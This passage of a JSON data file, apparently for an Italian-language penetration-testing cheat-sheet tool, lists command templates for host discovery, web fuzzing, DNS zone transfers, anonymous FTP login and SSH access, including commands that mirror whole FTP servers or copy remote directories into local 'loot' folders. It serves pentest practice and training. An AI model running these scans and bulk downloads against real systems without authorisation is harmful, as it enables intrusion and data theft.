        "template": "sudo nmap -sn -PS21,22,25,80,443,3389 <subnet> -oA nmap/ping_sweep",
        "description": "SYN ping (`-PS`) su porte comuni: scopre host via TCP quando l'ICMP è filtrato. Un SYN/ACK o un RST = host vivo."
      },
      {
        "id": "tcp-ack",
        "label": "TCP ACK ping",
        "template": "sudo nmap -sn -PA80,443 <subnet> -oA nmap/ping_sweep",
        "description": "ACK ping (`-PA`): attraversa i firewall stateless. Combinalo col SYN ping per coprire più casi."
      },
      {
        "id": "udp",
        "label": "UDP ping",
        "template": "sudo nmap -sn -PU53,161,137 <subnet> -oA nmap/ping_sweep",
        "description": "UDP ping (`-PU`) su DNS/SNMP/NetBIOS: utile quando sia TCP che ICMP sono bloccati ma qualche servizio UDP risponde."
      }
    ],
    "refs": [
      {
        "label": "Nmap host discovery",
        "url": "https://nmap.org/book/man-host-discovery.html"
      }
    ]
  },
  {
    "id": "arp-scan",
    "name": "arp-scan — host discovery L2",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Scoperta host a livello 2 via ARP: manda una richiesta ARP per ogni IP della subnet locale. È il metodo più affidabile in rete interna, perché l'ARP non è filtrabile da un firewall L3 e risponde anche chi ignora ICMP e TCP. Funziona solo sulla stessa rete fisica (niente routing). Serve root.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "arp"
    ],
    "tags": [
      "arp-scan",
      "arp",
      "discovery",
      "lan"
    ],
    "template": "sudo arp-scan -I <iface> --localnet",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "eth0"
      }
    ],
    "refs": [
      {
        "label": "arp-scan — Kali Tools",
        "url": "https://www.kali.org/tools/arp-scan/"
      }
    ]
  },
  {
    "id": "netdiscover",
    "name": "netdiscover — ARP discovery",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Discovery ARP in rete interna. La modalità passiva è utile per restare silenziosi dopo un pivot. Solo stessa L2, serve root.\n- `-r` = attivo, invia richieste ARP a tutta la subnet\n- `-p` = passivo, ascolta il traffico ARP senza inviare nulla",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "arp"
    ],
    "tags": [
      "netdiscover",
      "arp",
      "discovery",
      "passive"
    ],
    "template": "sudo netdiscover -i <iface> -r <subnet>",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "eth0"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "active",
        "label": "Attivo",
        "template": "sudo netdiscover -i <iface> -r <subnet>",
        "description": "Invia richieste ARP a tutta la subnet: veloce e completo."
      },
      {
        "id": "passive",
        "label": "Passivo",
        "template": "sudo netdiscover -i <iface> -p",
        "description": "Solo ascolto (`-p`): non invia pacchetti, mappa gli host dal traffico ARP che vede. Silenzioso ma lento."
      }
    ],
    "refs": [
      {
        "label": "netdiscover — Kali Tools",
        "url": "https://www.kali.org/tools/netdiscover/"
      }
    ]
  },
  {
    "id": "fping-sweep",
    "name": "fping — fast ICMP sweep",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Ping sweep ICMP ad alta velocità: manda gli echo in parallelo a tutta la subnet, molto più rapido di un ciclo di `ping` e comodo anche in rete esterna dove l'ICMP passa. L'output alimenta `live_hosts.txt`.\n- `-a` = stampa solo gli host vivi\n- `-g` = genera il range dalla subnet",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "fping",
      "icmp",
      "sweep",
      "discovery"
    ],
    "template": "fping -a -g <subnet> 2>/dev/null | tee live_hosts.txt",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "refs": [
      {
        "label": "fping — homepage",
        "url": "https://fping.org/"
      }
    ]
  },
  {
    "id": "ffuf-dir",
    "name": "ffuf — directory fuzz",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Directory Fuzzing",
    "description": "Bruteforce di file e directory web con SecLists. Scegli le estensioni in base allo stack rilevato (`.php`, `.aspx`…).\n- `-fc` = filtra per status code\n- `-fs` = filtra per dimensione risposta",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ffuf",
      "fuzzing",
      "web"
    ],
    "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Media",
        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
        "description": "Wordlist media: buon equilibrio copertura/tempo."
      },
      {
        "id": "ext",
        "label": "Con estensioni",
        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt,.bak,.conf,.xml,.aspx,.jsp",
        "description": "Aggiunge estensioni comuni: trova file (config, backup) oltre alle directory."
      },
      {
        "id": "recursion",
        "label": "Ricorsivo",
        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 2",
        "description": "Scende nelle directory trovate (profondità 2). Wordlist piccola per non esplodere."
      },
      {
        "id": "path",
        "label": "Sotto un path",
        "template": "ffuf -u http://<ip>/<path>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
        "description": "Fuzz dentro un path già scoperto (es. `/admin/FUZZ`)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Web pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      },
      {
        "label": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      }
    ]
  },
  {
    "id": "gobuster-dir",
    "name": "gobuster — directory",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Directory Fuzzing",
    "description": "Alternativa a ffuf per il dir busting. Comodo per confrontare i risultati quando ffuf dà falsi positivi.\n- `-t` = numero di thread\n- `-x` = estensioni da cercare, aggiungilo tu se vuoi i file (es. `php,html,txt,bak`)",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gobuster",
      "fuzzing",
      "web"
    ],
    "template": "gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -o gobuster.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "gobuster — GitHub",
        "url": "https://github.com/OJ/gobuster"
      }
    ]
  },
  {
    "id": "ffuf-vhost",
    "name": "ffuf — vhost (Host header)",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Virtual Hosts",
    "description": "Scopre virtual host fuzzando l'header `Host`, senza toccare `/etc/hosts`. I vhost nascondono spesso app interne.\n- `-fs` = filtra per dimensione risposta\n- `-fc` = filtra per status code",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ffuf",
      "vhost",
      "web"
    ],
    "template": "ffuf -u http://<ip> -H \"Host: FUZZ.<domain>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <fsize>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "inlanefreight.local"
      },
      {
        "key": "fsize",
        "label": "Filter size",
        "placeholder": "4242"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Web pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      }
    ]
  },
  {
    "id": "gobuster-vhost",
    "name": "gobuster — vhost",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Virtual Hosts",
    "description": "Vhost brute con gobuster. Richiede che il dominio risolva (mappa IP→dominio in `/etc/hosts`); altrimenti usa ffuf con l'header Host.\n- `--append-domain` = accoda il dominio di `-u` alle parole\n- `--exclude-length` = filtra la risposta di default",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gobuster",
      "vhost"
    ],
    "template": "gobuster vhost -u http://<domain> -w <wordlist> --append-domain --exclude-length <len>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "inlanefreight.local"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
      },
      {
        "key": "len",
        "label": "Exclude length",
        "placeholder": "436"
      }
    ],
    "refs": [
      {
        "label": "gobuster — GitHub",
        "url": "https://github.com/OJ/gobuster"
      }
    ]
  },
  {
    "id": "whatweb",
    "name": "whatweb — fingerprint",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Fingerprinting",
    "description": "Identifica tecnologie, CMS, framework e versioni di un web server. `-a 3` = aggressività massima (più richieste, più dettagli). Lancialo su ogni web server prima del fuzzing.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "whatweb",
      "fingerprint"
    ],
    "template": "whatweb http://<ip> -a 3",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "WhatWeb — GitHub",
        "url": "https://github.com/urbanadventurer/WhatWeb"
      }
    ]
  },
  {
    "id": "eyewitness",
    "name": "eyewitness — screenshot di massa",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Fingerprinting",
    "description": "Screenshot di tutte le URL di una lista: triage veloce di una superficie web ampia (capisci a colpo d’occhio quali app valgono). Genera un report HTML.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "eyewitness",
      "screenshot"
    ],
    "template": "eyewitness --web -f urls.txt -d eyewitness_output",
    "params": [],
    "refs": [
      {
        "label": "EyeWitness — GitHub",
        "url": "https://github.com/RedSiege/EyeWitness"
      }
    ]
  },
  {
    "id": "dig-reverse",
    "name": "dig — reverse PTR",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Reverse Lookup",
    "description": "Se la porta 53 è aperta, interroga il PTR PRIMA di tutto: spesso rivela il dominio senza indovinarlo. I PTR vivono nella zona `in-addr.arpa` (IP scritto al contrario).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "reverse",
      "ptr"
    ],
    "template": "dig -x <ip> @<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "DNS autoritativo",
        "template": "dig -x <ip> @<ip>",
        "description": "Chiede al DNS del target stesso: funziona se gestisce la propria zona reverse (tipico CTF/lab e DNS interni)."
      },
      {
        "id": "resolver",
        "label": "Resolver di default",
        "template": "dig -x <ip>",
        "description": "Usa il resolver della tua macchina: trova il PTR registrato sul DNS pubblico del provider."
      },
      {
        "id": "nslookup",
        "label": "nslookup",
        "template": "nslookup <ip> <ip>",
        "description": "Equivalente con nslookup, forzando la query verso il target."
      }
    ],
    "note": "# Come funziona\nI PTR record vivono nella zona `in-addr.arpa`: l'IP viene scritto al contrario. Es: `10.129.14.186` → query su `186.14.129.10.in-addr.arpa`.\n- **Caso 1** (authoritative): il DNS del target gestisce la propria zona reverse, quindi risponde direttamente con l'hostname. Tipico di CTF/lab e server DNS interni.\n- **Caso 2** (non authoritative): il PTR è registrato sul DNS pubblico del provider, quindi il resolver di default lo trova tramite la normale gerarchia DNS. Tipico di server pubblici.\n- **Nessuna risposta**: il PTR non è configurato: passa al zone transfer o al bruteforce.",
    "refs": [
      {
        "label": "HackTricks — Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ]
  },
  {
    "id": "dig-axfr",
    "name": "dig — AXFR zone transfer",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Zone Transfer",
    "description": "Tenta un trasferimento di zona completo: un DNS mal configurato consegna TUTTI i record (sottodomini, IP interni) in un colpo. Prova ogni nameserver trovato con `dig ns`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "axfr",
      "zone-transfer"
    ],
    "template": "dig axfr <domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ]
  },
  {
    "id": "dns-brute",
    "name": "DNS subdomain brute",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Subdomain Brute",
    "description": "Bruteforce attivo di sottodomini quando le fonti passive non bastano. Le permutazioni (`dnsgen` + `puredns`) generano varianti dai sottodomini noti e le risolvono in massa.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dns",
      "subdomains",
      "bruteforce"
    ],
    "template": "dnsenum --enum <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "dnsenum",
        "template": "dnsenum --enum <domain>",
        "description": "Bruteforce + zone transfer + lookup in un tool solo. Veloce da lanciare."
      },
      {
        "id": "puredns",
        "label": "puredns",
        "template": "puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain> --resolvers resolvers.txt",
        "description": "Bruteforce ad alta velocità con resolver multipli: gestisce wordlist enormi."
      },
      {
        "id": "permut",
        "label": "Permutazioni",
        "template": "dnsgen all_subs.txt | puredns resolve --resolvers resolvers.txt",
        "description": "Genera varianti dai sub noti (dev1→dev2, api-staging…) e le risolve."
      },
      {
        "id": "dnsrecon",
        "label": "Reverse range",
        "template": "dnsrecon -r <subnet> -n <ip>",
        "description": "PTR su un intero range: scopre host dal reverse DNS."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ]
  },
  {
    "id": "add-hosts",
    "name": "/etc/hosts — aggiungi voci",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Local Hosts",
    "description": "Dopo aver scoperto hostname e vhost, mappali all’IP per risolverli localmente. Obbligatorio per i vhost basati su nome e per i redirect verso un dominio.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "etc-hosts",
      "setup"
    ],
    "template": "echo \"<ip> <domain>\" | sudo tee -a /etc/hosts",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Hosts",
        "ctx": "domain",
        "placeholder": "corp.local dc01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux",
        "template": "echo \"<ip> <domain>\" | sudo tee -a /etc/hosts",
        "description": "Accoda la riga a `/etc/hosts` (serve sudo)."
      },
      {
        "id": "win-ps",
        "label": "Windows PS",
        "template": "Add-Content -Path \"C:\\Windows\\System32\\drivers\\etc\\hosts\" -Value \"<ip> <domain>\"",
        "description": "PowerShell come Administrator."
      },
      {
        "id": "win-cmd",
        "label": "Windows cmd",
        "template": "echo <ip> <domain> >> C:\\Windows\\System32\\drivers\\etc\\hosts",
        "description": "Prompt cmd come Administrator."
      }
    ],
    "refs": []
  },
  {
    "id": "ftp-anon",
    "name": "ftp — anonymous login",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Anonymous Access",
    "description": "Prova l’accesso anonimo: utente anonymous, password vuota o una email qualsiasi.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "ftp",
      "anonymous"
    ],
    "template": "ftp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Scaricare file dalla sessione\n- `prompt off` disattiva la conferma a ogni file, poi `mget *` scarica tutti i file della cartella corrente.\n- `binary` prima di scaricare file non testuali (zip, immagini, db).\n- Il client `ftp` non è ricorsivo: per l'intero albero usa `lftp` (`mirror`) o `wget -m`."
  },
  {
    "id": "nmap-ftp",
    "name": "nmap — FTP scripts",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Anonymous Access",
    "description": "Script NSE FTP: accesso anonimo, bounce, banner (syst) e backdoor vsftpd.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "nmap",
      "ftp"
    ],
    "template": "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ftp-wget",
    "name": "wget — download FTP",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Pillaging",
    "description": "Download ricorsivo di tutti i file via FTP anonimo (mirror). `--no-passive` forza la modalità active.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "wget",
      "ftp",
      "download"
    ],
    "template": "wget -m --no-passive ftp://anonymous:@<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ftp-lftp",
    "name": "lftp — download FTP",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Pillaging",
    "description": "Client FTP completo per scaricare in blocco. Con `mirror` ricrei l'albero remoto in locale; con i filtri prendi solo ciò che serve. Più affidabile di `wget` su NAT/passive e supporta i download paralleli.\n- `-u anonymous,` = login anonimo, password vuota (occhio alla virgola)\n- `mirror` = scarica ricorsivamente una directory\n- `--include-glob` / `--exclude-glob` = filtra quali file prendere\n- `--parallel=N` = N trasferimenti in parallelo",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "lftp",
      "ftp",
      "download",
      "mirror"
    ],
    "template": "lftp -u anonymous, <ip> -e \"mirror --verbose --parallel=4 / ./ftp_loot; bye\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/uploads"
      },
      {
        "key": "user",
        "label": "Utente",
        "placeholder": "ftpuser"
      },
      {
        "key": "pass",
        "label": "Password",
        "placeholder": "password"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutto",
        "template": "lftp -u anonymous, <ip> -e \"mirror --verbose --parallel=4 / ./ftp_loot; bye\"",
        "description": "Scarica ricorsivamente tutto il server (`/`) dentro `./ftp_loot`."
      },
      {
        "id": "glob",
        "label": "Solo per estensione",
        "template": "lftp -u anonymous, <ip> -e \"mirror --include-glob '*.conf' --include-glob '*.txt' / ./ftp_loot; bye\"",
        "description": "Solo i file che matchano il glob (`*.conf`, `*.txt`…): utile quando il server è grande."
      },
      {
        "id": "dir",
        "label": "Solo una cartella",
        "template": "lftp -u anonymous, <ip> -e \"mirror <rpath> ./ftp_loot; bye\"",
        "description": "Scarica solo la directory remota indicata in `<rpath>`."
      },
      {
        "id": "single",
        "label": "File singolo",
        "template": "lftp -u anonymous, <ip> -e \"get <rpath>; bye\"",
        "description": "Prende un solo file: `<rpath>` = path completo, es. `/backup/db.sql`."
      },
      {
        "id": "creds",
        "label": "Mirror con cred",
        "template": "lftp -u <user>,<pass> <ip> -e \"mirror / ./ftp_loot; bye\"",
        "description": "Come il mirror completo ma con login autenticato invece che anonimo."
      },
      {
        "id": "access-anon",
        "label": "Accesso anonimo",
        "template": "lftp -u anonymous, <ip>",
        "description": "Apre una sessione lftp interattiva in anonimo. Dentro usi `ls`, `cd`, `get`, `mget` e `mirror` (ricorsivo)."
      },
      {
        "id": "access-creds",
        "label": "Accesso con cred",
        "template": "lftp -u <user>,<pass> <ip>",
        "description": "Sessione lftp interattiva autenticata. Stessi comandi interni; `mirror <dir> .` per scaricare ricorsivamente."
      }
    ],
    "refs": [
      {
        "label": "lftp — Kali Tools",
        "url": "https://www.kali.org/tools/lftp/"
      }
    ],
    "note": "# Scaricare file dalla sessione\nDentro la shell di lftp lancia `mirror <dir_remota> <dir_locale>` per il ricorsivo, `mget *.conf` per i glob, `get file` per uno solo."
  },
  {
    "id": "ssh-connect",
    "name": "ssh — connect",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Access",
    "description": "Connessione SSH con le credenziali trovate: password o chiave privata. Se il server è datato, il client moderno può rifiutare gli algoritmi legacy e vanno riabilitati a mano.\n- `-i <key>` = login con chiave privata (prima `chmod 600`)\n- `-p <port>` = porta non standard\n- `-o StrictHostKeyChecking=no` = salta il prompt della host key",
    "platform": "cross-platform",
    "requires": [
      "creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "ssh",
      "connect",
      "login"
    ],
    "template": "ssh <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      },
      {
        "key": "port",
        "label": "Porta",
        "placeholder": "22"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "ssh <user>@<ip>",
        "description": "Login con password (te la chiede dopo la connessione)."
      },
      {
        "id": "key",
        "label": "Chiave privata",
        "template": "ssh -i <key> <user>@<ip>",
        "description": "Login con chiave privata. La chiave deve avere permessi `600` (`chmod 600 <key>`)."
      },
      {
        "id": "port",
        "label": "Porta custom",
        "template": "ssh -p <port> <user>@<ip>",
        "description": "Quando SSH non è sulla porta 22."
      },
      {
        "id": "legacy",
        "label": "Server vecchio",
        "template": "ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group14-sha1 -o PubkeyAcceptedAlgorithms=+ssh-rsa <user>@<ip>",
        "description": "Server SSH datato: riabilita gli algoritmi che OpenSSH moderno disabilita. Sintomi: `no matching host key type` o `no matching key exchange method`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting SSH",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
      }
    ]
  },
  {
    "id": "ssh-scp",
    "name": "scp — copy over SSH",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Copia file sul canale cifrato SSH. La direzione dipende da dove metti `<user>@<ip>:` (sorgente o destinazione).\n- `-r` = ricorsivo, intere cartelle\n- `-P <port>` = porta SSH non standard (P maiuscola, diversa da ssh)\n- `-i <key>` = usa una chiave privata",
    "platform": "cross-platform",
    "requires": [
      "creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "scp",
      "ssh",
      "file-transfer"
    ],
    "template": "scp <user>@<ip>:<rpath> ./",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/home/user/file"
      },
      {
        "key": "lpath",
        "label": "Path locale",
        "placeholder": "./file"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      }
    ],
    "variants": [
      {
        "id": "download",
        "label": "Scarica",
        "template": "scp <user>@<ip>:<rpath> ./",
        "description": "Prende un file dal target e lo salva nella cartella corrente."
      },
      {
        "id": "upload",
        "label": "Carica",
        "template": "scp <lpath> <user>@<ip>:<rpath>",
        "description": "Manda un file locale sul target."
      },
      {
        "id": "recursive",
        "label": "Cartella",
        "template": "scp -r <user>@<ip>:<rpath> ./loot",
        "description": "Scarica ricorsivamente un'intera directory remota."
      },
      {
        "id": "key",
        "label": "Con chiave",
        "template": "scp -i <key> <user>@<ip>:<rpath> ./",
        "description": "Come download ma autenticandosi con chiave privata."
      }
    ],
    "refs": [
      {
        "label": "scp — man page",
        "url": "https://man.openbsd.org/scp.1"
      }
    ],
    "note": "# Se scp non è disponibile\n- Un file: `ssh <user>@<ip> \"cat <rpath>\" > file`\n- Scarica una cartella: `ssh <user>@<ip> \"tar czf - <rpath>\" | tar xzf -`\n- Carica una cartella: `tar czf - <lpath> | ssh <user>@<ip> \"tar xzf - -C /dest\"`"
  },
  {
    "id": "ssh-sftp",
    "name": "sftp — interactive transfer",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Trasferimento interattivo su SSH, comodo per navigare e prendere più file. Comandi dentro la shell: `ls`/`cd` (remoto), `lls`/`lcd` (locale), `get`/`put`, `mget`/`mput` per i glob, `get -r <dir>` per il ricorsivo.",
    "platform": "cross-platform",
    "requires": [
      "creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "sftp",
      "ssh",
      "file-transfer"
    ],
    "template": "sftp <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/home/user/file"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Interattivo",
        "template": "sftp <user>@<ip>",
        "description": "Apre la sessione. Poi `get`/`put`, `mget *.conf`, `get -r <dir>` per il ricorsivo."
      },
      {
        "id": "get",
        "label": "Scarica un file",
        "template": "sftp <user>@<ip>:<rpath> ./",
        "description": "Get diretto di un file senza entrare nella shell."
      },
      {
        "id": "key",
        "label": "Con chiave",
        "template": "sftp -i <key> <user>@<ip>",
        "description": "Sessione autenticata con chiave privata."
      }
    ],
    "refs": [
      {
        "label": "sftp — man page",
        "url": "https://man.openbsd.org/sftp.1"
      }
    ]
  },
  {
    "id": "ssh-rsync",
    "name": "rsync — sync over SSH",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Sincronizza cartelle su SSH: veloce, incrementale e ripristinabile, ideale per file grandi o trasferimenti interrotti.\n- `-a` = modo archivio, ricorsivo con permessi e timestamp\n- `-v` = verboso\n- `-z` = comprime in transito\n- `-e ssh` = usa SSH come trasporto",
    "platform": "linux",
    "requires": [
      "creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "rsync",
      "ssh",
      "file-transfer"
    ],
    "template": "rsync -avz -e ssh <user>@<ip>:<rpath> ./loot",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/var/www/"
      },
      {
        "key": "lpath",
        "label": "Path locale",
        "placeholder": "./loot"
      }
    ],
    "variants": [
      {
        "id": "download",
        "label": "Scarica",
        "template": "rsync -avz -e ssh <user>@<ip>:<rpath> ./loot",
        "description": "Sincronizza una cartella remota in locale."
      },
      {
        "id": "upload",
        "label": "Carica",
        "template": "rsync -avz -e ssh <lpath> <user>@<ip>:<rpath>",
        "description": "Sincronizza una cartella locale sul target."
      }
    ],
    "refs": [
      {
        "label": "rsync — man page",
        "url": "https://linux.die.net/man/1/rsync"
      }
    ]
  },
  {
    "id": "ssh-banner",
    "name": "nc — SSH banner grab",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Fingerprinting",
    "description": "Prende il banner SSH: la versione spesso rivela l’OS e la patch.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "nc",
      "ssh",
      "banner"
    ],
    "template": "nc -nv <ip> 22",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ssh-algos",
    "name": "nmap — SSH algos & hostkey",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Fingerprinting",
    "description": "Enumera gli algoritmi KEX/cifrari supportati e la host key.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "nmap",
      "ssh"
    ],
    "template": "nmap -p22 --script ssh2-enum-algos,ssh-hostkey <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ssh-auth-methods",
    "name": "ssh — list auth methods",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Auth Discovery",
    "description": "Mostra quali metodi di autenticazione accetta il server (password, publickey…).",
